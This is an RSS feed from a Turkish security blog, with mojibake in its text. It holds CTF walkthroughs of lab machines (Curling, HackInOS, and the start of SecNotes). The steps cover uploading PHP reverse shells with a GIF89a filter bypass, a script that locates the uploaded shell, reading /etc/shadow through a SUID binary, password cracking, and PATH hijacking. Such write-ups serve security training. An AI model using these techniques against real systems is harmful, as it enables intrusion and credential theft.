<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>CTF &#8211; RÄ±dvan KAPLAN</title>
	<atom:link href="https://ridvankaplan.github.io/category/ctf/feed" rel="self" type="application/rss+xml" />
	<link>https://ridvankaplan.github.io/</link>
	<description>All Izz Well</description>
	<lastBuildDate>Sat, 09 May 2020 11:41:00 +0000</lastBuildDate>
	<language>tr</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.1.1</generator>
	<item>
		<title>Curling &#8211; Hack The Box</title>
		<link>https://ridvankaplan.github.io/hack-the-box/curling-hack-the-box.html</link>
					<comments>https://ridvankaplan.github.io/hack-the-box/curling-hack-the-box.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Sun, 31 Mar 2019 14:49:38 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Hack The Box]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=544</guid>

					<description><![CDATA[Merhaba !!! DÃ¼n emekliye ayrÄ±lan Curling makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸacaÄŸÄ±m. Ã–ncelikle makinemizin aÄŸ haritasÄ±nÄ± Ã§Ä±kartmak ile baÅŸlayalÄ±m. Hedef makinemizde 80 ve 22 portlarÄ± aÃ§Ä±kmÄ±ÅŸ. Web tarayÄ±cÄ±mÄ±zda&#8230;]]></description>
										<content:encoded><![CDATA[
<p>Merhaba !!!</p>



<p>DÃ¼n emekliye ayrÄ±lan Curling makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸacaÄŸÄ±m. Ã–ncelikle makinemizin aÄŸ haritasÄ±nÄ± Ã§Ä±kartmak ile baÅŸlayalÄ±m.</p>



<span id="more-544"></span>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-1-1.png" alt="" class="wp-image-546"/></figure>



<p>Hedef makinemizde 80 ve 22 portlarÄ± aÃ§Ä±kmÄ±ÅŸ. Web tarayÄ±cÄ±mÄ±zda incelemeye baÅŸlÄ±yoruz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-3-1024x496.png" alt="" class="wp-image-547"/></figure>



<p>YazÄ±larÄ±n paylaÅŸÄ±ldÄ±ÄŸÄ± bir web sitesi. CTF&#8217;lerden alÄ±ÅŸkanlÄ±k olarak sayfalarÄ±n kaynak kodlarÄ±na bakarÄ±m. Burada da bakÄ±nca bir ÅŸeyler veriyor.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-4.png" alt="" class="wp-image-548"/></figure>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-5.png" alt="" class="wp-image-549"/></figure>



<p>secret.txt adÄ±nda bir dosya bulunmakta. String&#8217;e bakÄ±ldÄ±ÄŸÄ±nda base64 ile encode edildiÄŸi anlaÅŸÄ±lÄ±yor.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-6.png" alt="" class="wp-image-550"/></figure>



<p>Linux terminalimizde decode edip parolamÄ±zÄ± alÄ±yoruz. Ä°lk Ã¶nce ssh ile denedim ama bu kadar kolay deÄŸilmiÅŸ. Web tarafÄ±nda devam ediyoruz.</p>



<p>Web sitesinin dizinlerini tarayalÄ±m.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-2-1024x546.png" alt="" class="wp-image-551"/></figure>



<p>Her zamanki komutumuzla ile taradÄ±ktan sonra <strong>/administrator</strong> dizinini gÃ¶rÃ¼yoruz ve giriÅŸ yapmaya Ã§alÄ±ÅŸÄ±yoruz.</p>



<p>ParolamÄ±z var ama kullanÄ±cÄ± adÄ±mÄ±z yok. YazÄ±lar arasÄ±nda biraz gezindikten sonra ilk yazÄ±nÄ±n sonunda <strong>Floris</strong> ismine ulaÅŸÄ±yoruz. Ve giriÅŸ yapÄ±yoruz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-7-1024x513.png" alt="" class="wp-image-552"/></figure>



<p><strong>Joomla 3.8.8</strong> versiyonu sistemde kuruluymuÅŸ (SaÄŸ alt kÄ±sÄ±mda). Buradan sonra aklÄ±ma direkt dosya yÃ¼kleyip veya herhangi bir php dosyanÄ±n iÃ§eriÄŸini kendi php reverse shell&#8217;imle deÄŸiÅŸtirerek shell almayÄ± denedim. BazÄ± linux sistemlerde default olarak <strong>/usr/share/webshells/php/php-reverse-shell.php ÅŸeklinde</strong> bulunuyor. </p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-8-1024x332.png" alt="" class="wp-image-553"/></figure>



<p>Ã–nce nc ile dinleyerek ve deÄŸiÅŸtirdiÄŸim php sayfasÄ±na giderek shell&#8217;i alÄ±yoruz. Buradan sonra yetki yÃ¼kseltme adÄ±mlarÄ±na geÃ§iyoruz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-9.png" alt="" class="wp-image-554"/></figure>



<p>/<strong>home/floris</strong> dizini iÃ§inde birkaÃ§ dosya bulunmakta. Sadece password_backup adlÄ± bir dosyayÄ± okuma iznimiz bulunmakta. BazÄ± verilerin <strong>hexdump</strong>&#8216;Ä± alÄ±nmÄ±ÅŸ hali.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-10.png" alt="" class="wp-image-555"/></figure>



<p>Rahat iÅŸlem yapabilmek iÃ§in <a rel="noreferrer noopener" aria-label="nc ile kendi local'ime  (yeni sekmede aÃ§Ä±lÄ±r)" href="https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/" target="_blank">nc ile kendi local&#8217;ime </a>alÄ±yorum dosyayÄ±. </p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-11-1024x553.png" alt="" class="wp-image-556"/></figure>



<p>Sonra backup dosyasÄ±ndan password.txt adlÄ± bir dosyayÄ± Ã§Ä±karttÄ±m. Bu kÄ±sÄ±m Linux 101 olduÄŸu iÃ§in eÄŸer bilmiyorsanÄ±z <a href="https://overthewire.org/wargames/bandit/" target="_blank" rel="noreferrer noopener" aria-label="buradaki Ã¶rnekleri (yeni sekmede aÃ§Ä±lÄ±r)">buradaki Ã¶rnekleri</a> Ã§Ã¶zerek daha iyi Ã¶ÄŸrenebilirsiniz. </p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-12-1024x524.png" alt="" class="wp-image-557"/></figure>



<p>AldÄ±ÄŸÄ±mÄ±z parola ile ssh&#8217;a baÄŸlanÄ±yoruz. Ve root olmak iÃ§in biraz daha inceliyoruz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-13.png" alt="" class="wp-image-558"/></figure>



<p><strong>/home/floris/admin-area </strong>iÃ§inde iki dosyayÄ± fark ediyoruz. </p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-14.png" alt="" class="wp-image-559"/></figure>



<p>DosyalarÄ±n iÃ§eriÄŸine baktÄ±ÄŸÄ±mÄ±zda <strong>input</strong> dosyasÄ±nda bir url bulunmakta. <strong>Reportta</strong> ise <strong>curl http://127.0.0.1/ </strong>komutunun Ã§Ä±ktÄ±sÄ± bulunmakta. Root yetkisi ile Ã§alÄ±ÅŸÄ±yor ve bizim yazma yetkimiz var. </p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-15.png" alt="" class="wp-image-562"/></figure>



<p>Burada url kÄ±smÄ±na okumak istediÄŸimiz dosyanÄ±n yolunu vererek okumayÄ± deneyebiliriz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-16-1.png" alt="" class="wp-image-564"/></figure>



<p>Biraz bekledikten sonra root yetkisiyle <strong>curl file:///root/root.txt </strong>Ã§alÄ±ÅŸtÄ±ktan sonra report kÄ±smÄ±na flag&#8217;imiz dÃ¼ÅŸtÃ¼</p>



<p>OkuduÄŸunuz iÃ§in teÅŸekkÃ¼rler. YazÄ±larÄ±mda herhangi bir teknik hata varsa bildirmekten Ã§ekinmeyinizâ€¦</p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/curling-hack-the-box.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>HackInOS: 1 &#8211; Vulnhub</title>
		<link>https://ridvankaplan.github.io/vulnhub/hackinos-1-vulnhub.html</link>
					<comments>https://ridvankaplan.github.io/vulnhub/hackinos-1-vulnhub.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Fri, 15 Mar 2019 16:23:31 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Vulnhub]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=526</guid>

					<description><![CDATA[Merhaba !!! Bu yazÄ±mda Vulnhub&#8217;ta GaziCyber tarafÄ±ndan hazÄ±rlanmÄ±ÅŸ olan HackInOS makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸacaÄŸÄ±m. EÄŸer makineyi Ã§Ã¶zmeyi dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z lÃ¼tfen okumayÄ±nÄ±z. TakÄ±ldÄ±ÄŸÄ±nÄ±z yerlerde gÃ¶z atÄ±p kendiniz uÄŸraÅŸmanÄ±z&#8230;]]></description>
										<content:encoded><![CDATA[
<p>Merhaba !!!<br><br>Bu yazÄ±mda Vulnhub&#8217;ta GaziCyber tarafÄ±ndan hazÄ±rlanmÄ±ÅŸ olan HackInOS makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸacaÄŸÄ±m. </p>



<p>EÄŸer makineyi Ã§Ã¶zmeyi dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z lÃ¼tfen okumayÄ±nÄ±z. TakÄ±ldÄ±ÄŸÄ±nÄ±z yerlerde gÃ¶z atÄ±p kendiniz uÄŸraÅŸmanÄ±z size daha Ã§ok ÅŸey katacaktÄ±r. Ã–ncelikle makinenin IP adresini <strong>/etc/hosts</strong> iÃ§erisine <strong>localhost</strong> olarak ekliyoruz.<br>ArdÄ±ndan nmap taramamÄ±zla aÃ§Ä±k portlarÄ± inceliyoruz.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nmap.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nmap.png" alt="" class="wp-image-527"/></a></figure>



<p>TÃ¼m portlarÄ± taradÄ±k ve sadece<strong> 22, 8000</strong> portlarÄ± aÃ§Ä±k olduÄŸu gÃ¶zÃ¼kÃ¼yor.</p>



<p>8000 portunda http server&#8217;Ä± Ã§alÄ±ÅŸÄ±yor. Web tarayÄ±cÄ±mÄ±zda aÃ§tÄ±ÄŸÄ±mÄ±z da wordpress&#8217;in Ã§alÄ±ÅŸtÄ±ÄŸÄ± gÃ¶zÃ¼kÃ¼yor. Biraz baktÄ±ktan sonra herhangi bir ÅŸey bulamadÄ±m. </p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/main-page.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/main-page-1024x480.png" alt="" class="wp-image-528"/></a></figure>



<p>Dirb ile dizinleri tarÄ±yoruz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/dirb.png" alt="" class="wp-image-529"/></figure>



<p>Dikkatimizi Ã§eken <strong>/robots.txt</strong> bulunmakta. Ä°Ã§erisine baktÄ±ÄŸÄ±mÄ±zda iki sayfa ismi bulunmaktadÄ±r.</p>



<pre class="wp-block-preformatted">Disallow:/upload.php
Disallow:/uploads</pre>



<p><strong>upload.php </strong>sayfasÄ±na baktÄ±ÄŸÄ±mÄ±zda dosya transferi  yapmamÄ±za izin veriyor. Ama bazÄ± filtrelemeler bulunmakta. SayfanÄ±n kaynak kodunda ipucu amaÃ§lÄ± bir github linki bulunmakta. Ä°ncelediÄŸimiz de upload.php nin kaynak kodu olduÄŸu gÃ¶zÃ¼kmektedir.<br></p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/upload-1024x169.png" alt="" class="wp-image-530"/></figure>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/hint.png" alt="" class="wp-image-531"/></figure>



<pre class="wp-block-code"><code>https:&#47;&#47;github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php</code></pre>



<p>Github linkinde yÃ¼klenen dosyanÄ±n kontrol edilmesi ve nereye nasÄ±l isminin deÄŸiÅŸtirilip yÃ¼klendiÄŸi gÃ¶zÃ¼kmektedir. Dosya ismiyle birlikte <strong>1 ile 100 </strong>arasÄ±nda rastgele bir sayÄ± ile birleÅŸtirip <strong>md5</strong>&#8216;ini aldÄ±ktan sonra /uploads/ dizini iÃ§erisine uzantÄ±sÄ±nÄ± ekleyip yÃ¼klemektedir.</p>



<p>Ã–rneÄŸin dosya ismi resim.png &gt; resim.png34 &gt; 761d063cafd767ae9504ca2006c4aec7.png  &gt; ÅŸeklinde /uploads dizinine yÃ¼klemektedir. AyrÄ±ca dosyanÄ±n tipi de kontrol edilmektedir.</p>



<p>Php shell yÃ¼klemeyi deneyebiliriz. Ã–ncelikle /usr/share/webshells/php/php-reverse-shell.php dosyasÄ±nÄ± kendi ip adresimi deÄŸiÅŸtirerek dÃ¼zenledim.</p>



<p>DosyayÄ± yÃ¼klerken burp suite ile araya girip <strong>Content-Type:image/gif</strong> ve ilk satÄ±ra <code><strong>GIF89a;</strong></code>ekleyerek deÄŸiÅŸtiriyoruz. Ã‡Ã¼nkÃ¼ kontrol esnasÄ±nda bunlarÄ± kontrol ediyor ve deÄŸiÅŸtirmezsek php uzantÄ±lÄ± bir dosya yÃ¼klememize izin vermiyor.<br></p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/php-shell-1024x512.png" alt="" class="wp-image-532"/></figure>



<p>YÃ¼kledikten sonra /uploads dizinine baktÄ±ÄŸÄ±mÄ±zda forbidden alÄ±yoruz. Yani dosyalarÄ± listeleyemiyoruz. Direkt ismi ile kaydetmediÄŸi iÃ§in basit bir python script&#8217;i yazmam gerekti. BetiÄŸim aÅŸaÄŸÄ±da bulunmaktadÄ±r.</p>



<pre class="wp-block-code"><code>#!/usr/bin/env python

import hashlib
import requests

print("******* Find The File !!! ************")

filename = "php-reverse-shell.php"

def request(url):
    response = requests.head(url)
    if response.status_code == 200:
        print "Found!"
        print url


def md5Enc(file):
	md5 = hashlib.md5(file.encode())
	md5 = md5.hexdigest()
	dir = "uploads/" + md5 + ".php"
	#print(dir)
	request("http://localhost:8000/" + dir)

def loop():
	for i in range(1,101):
		md5Enc(filename + str(i))

def main():
	loop()

main()
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/find.png" alt="" class="wp-image-533"/></figure>



<p>Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ndeki gibi bulduktan sonra <strong>nc</strong> ile dinleyip baÄŸlantÄ±ya gidiyorum ve <strong>www-data </strong>kullanÄ±cÄ±sÄ± olarak shell alÄ±yorum.<br></p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/user-1024x263.png" alt="" class="wp-image-534"/></figure>



<p>Python script&#8217;i ile etkileÅŸimli aldÄ±ktan sonra yetki yÃ¼kseltme adÄ±mlarÄ±na geÃ§iyorum. Ä°lk adÄ±mlardan biri olan SUID bit&#8217;e sahip olan dosyalarÄ± inceliyorum ve deÄŸiÅŸik bir komut dikkatimi Ã§ekiyor.</p>



<p> <br></p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/suid.png" alt="" class="wp-image-535"/></figure>



<p><strong>/usr/bin/tai</strong>l komutu ile dosyalarÄ± okuyabiliriz. EÄŸer bu komut root yetkisi ile Ã§alÄ±ÅŸÄ±yorsa ki Ã§alÄ±ÅŸÄ±yor root kullanÄ±cÄ±sÄ±na Ã¶zel bir dosya okuyalÄ±m. Ã–rneÄŸin <strong>/etc/shadow</strong> dosyasÄ±.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/shadow-1024x343.png" alt="" class="wp-image-536"/></figure>



<p><strong>/etc/shadow </strong>dosyamÄ±zda root kullanÄ±cÄ±sÄ±nÄ±n parolasÄ±nÄ±n hashli hali Ã§Ä±kÄ±yor. Hemen localimize Ã§ekip kÄ±rmaya Ã§alÄ±ÅŸÄ±yoruz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/hash-crack-1024x285.png" alt="" class="wp-image-537"/></figure>



<p><strong>john</strong> aracÄ±mÄ±zla kÄ±rÄ±yoruz ve root kullanÄ±cÄ±sÄ±nÄ±n parolasÄ±na sahip oluyoruz.</p>



<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/root.png" alt="" class="wp-image-538"/></figure>



<p>ParolamÄ±zÄ± girdikten sonra root kullanÄ±cÄ±sÄ±na geÃ§iyoruz ve flagâ€™imizi okuyoruz. Ama makine henÃ¼z bitmiÅŸ deÄŸil. Ä°Ã§ aÄŸdaki diÄŸer makinelerin IP adreslerini bulmak iÃ§in&nbsp;<strong>arp</strong>&nbsp;komutunu kullanÄ±yorum.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="637" height="144" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/arp.png" alt="" class="wp-image-633" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/arp.png 637w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/arp-300x68.png 300w" sizes="(max-width: 637px) 100vw, 637px" /></figure>



<p>3 tane IP karÅŸÄ±mÄ±za Ã§Ä±ktÄ±. Bu makinelerin aÃ§Ä±k portlarÄ±nÄ±&nbsp;<strong>nc</strong>&nbsp;ile tarayabiliriz.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="732" height="164" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/scan-ports.png" alt="" class="wp-image-634" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/scan-ports.png 732w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/scan-ports-300x67.png 300w" sizes="(max-width: 732px) 100vw, 732px" /></figure>



<p>172.18.0.3 ipâ€™li makinede mysql portu aÃ§Ä±kmÄ±ÅŸ. Ä°lk makineye girdiÄŸimde konfigÃ¼rasyon dosyalarÄ±nÄ± incelerken veritabanÄ± ile ilgili bazÄ± veritabanÄ± bilgileri bulmuÅŸtum. /<strong>var/www/html/wp-config.php</strong>&nbsp;dosyasÄ±nÄ±n iÃ§erisinde.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="703" height="296" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/wp-pass.png" alt="" class="wp-image-635" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/wp-pass.png 703w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/wp-pass-300x126.png 300w" sizes="(max-width: 703px) 100vw, 703px" /></figure>



<p>Mysql ile ilgili makineye baÄŸlanmayÄ± deneyelim.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="829" height="516" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1.png" alt="" class="wp-image-636" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1.png 829w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1-300x187.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1-768x478.png 768w" sizes="(max-width: 829px) 100vw, 829px" /></figure>



<p>Evet baÄŸlandÄ±k ve veritabanlarÄ±nÄ± gÃ¶rÃ¼yoruz. TablolarÄ±nÄ± ve verileri inceleyelim.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="818" height="830" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2.png" alt="" class="wp-image-637" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2.png 818w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2-296x300.png 296w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2-768x779.png 768w" sizes="(max-width: 818px) 100vw, 818px" /></figure>



<p>Ä°lgili tablodan bazÄ± bilgiler Ã§Ä±ktÄ±. Pw kÄ±smÄ± MD5 ile hashlenmiÅŸ gibi duruyor. Googleâ€™ladÄ±ÄŸÄ±mÄ±zda kÄ±rÄ±lmÄ±ÅŸ hali karÅŸÄ±mÄ±za Ã§Ä±kÄ±yor.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="1024" height="143" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1.png" alt="" class="wp-image-638" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1.png 1024w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1-300x42.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1-768x107.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Makinelerden birinde ssh portu aÃ§Ä±ktÄ± bu hesap bilgilerini deneyelim.<br></p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="799" height="368" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2.png" alt="" class="wp-image-639" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2.png 799w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2-300x138.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2-768x354.png 768w" sizes="(max-width: 799px) 100vw, 799px" /></figure>



<p>Evet ssh ile baÄŸlandÄ±k. Root olmak iÃ§in biraz araÅŸtÄ±rÄ±yoruz.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="826" height="226" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1.png" alt="" class="wp-image-640" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1.png 826w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1-300x82.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1-768x210.png 768w" sizes="(max-width: 826px) 100vw, 826px" /></figure>



<p>Bu sefer Ã§ok zorlanmadan dosyamÄ±zÄ± buluyoruz. SUID biti ile Ã§alÄ±ÅŸan bir dosya. Ã‡alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda root Ã§Ä±ktÄ±sÄ± veriyor. Strings ile iÃ§eriÄŸini inceleyeliyoruz.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="836" height="732" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2.png" alt="" class="wp-image-641" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2.png 836w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2-300x263.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2-768x672.png 768w" sizes="(max-width: 836px) 100vw, 836px" /></figure>



<p>Ä°Ã§erisinde bir yerde whoami komutu geÃ§iyor. C kodundan derlenmiÅŸ.&nbsp;<strong>system(â€œwhoamiâ€)&nbsp;</strong>gibi bir kod olmalÄ±. Path deÄŸiÅŸkeni ile iÃ§erisindeki&nbsp;<strong>whoami&nbsp;</strong>komutunu istismar ederek root kullanÄ±cÄ±sÄ±na geÃ§ebiliriz.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="1024" height="158" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1.png" alt="" class="wp-image-642" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1.png 1024w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1-300x46.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1-768x119.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nde ki gibi root kullanÄ±cÄ±sÄ±na geÃ§ebiliriz.</p>



<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="1024" height="631" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-1024x631.png" alt="" class="wp-image-643" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-1024x631.png 1024w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-300x185.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-768x473.png 768w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4.png 1082w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Makineyi yayÄ±nladÄ±klarÄ± iÃ§in <strong>GaziCyber</strong> ekibine ve makinede tÃ¼m emeÄŸi geÃ§en arkadaÅŸlara teÅŸekkÃ¼r ederim.</p>



<p>OkuduÄŸunuz iÃ§in teÅŸekkÃ¼rler. YazÄ±larÄ±mda herhangi bir teknik hata varsa bildirmekten Ã§ekinmeyinizâ€¦</p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/vulnhub/hackinos-1-vulnhub.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>SecNotes &#8211; Hack The Box</title>
		<link>https://ridvankaplan.github.io/hack-the-box/secnotes-hack-the-box.html</link>
					<comments>https://ridvankaplan.github.io/hack-the-box/secnotes-hack-the-box.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Sun, 20 Jan 2019 07:09:24 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Hack The Box]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=433</guid>

					<description><![CDATA[Merhaba !!! Åimdi Hack The Box iÃ§erisinde yeni emekliye ayrÄ±lmÄ±ÅŸ SecNotes makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ inceleyeceÄŸiz. Ã–ncelikle nmap taramasÄ±yla port durumlarÄ±nÄ± inceleyelim. Hedef makinemiz Windows sunucu Ã¼zerinde&#8230;]]></description>
										<content:encoded><![CDATA[
<p>Merhaba !!!</p>



<p>Åimdi Hack The Box iÃ§erisinde yeni emekliye ayrÄ±lmÄ±ÅŸ SecNotes makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ inceleyeceÄŸiz.</p>



<span id="more-433"></span>



<p>Ã–ncelikle nmap taramasÄ±yla port durumlarÄ±nÄ± inceleyelim.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-1.png" alt="" class="wp-image-434"/></a><figcaption><br><br></figcaption></figure>



<p>Hedef makinemiz Windows sunucu Ã¼zerinde Ã§alÄ±ÅŸÄ±yormuÅŸ ve 3 tane port aÃ§Ä±kmÄ±ÅŸ. Ã–ncelikle 80 portunu tarayÄ±cÄ±mÄ±z Ã¼zerinde inceleyelim.</p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-2.png" alt="" class="wp-image-435"/></a><figcaption><br><br></figcaption></figure>



<p>TarayÄ±cÄ±mÄ±zda aÃ§Ä±nca direkt giriÅŸ sayfasÄ±na yÃ¶nlendiriyor. Ã–ncelikle normal bir kullanÄ±cÄ±yla kayÄ±t olup giriÅŸ yapÄ±yorum. <br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-3-1024x454.png" alt="" class="wp-image-436"/></a><figcaption><br><br></figcaption></figure>



<p>NotlarÄ±mÄ±zÄ± kaydettiÄŸimiz bir internet sitesiymiÅŸ. Yeni not ekleme, parola deÄŸiÅŸtirme gibi seÃ§enekler var. </p>



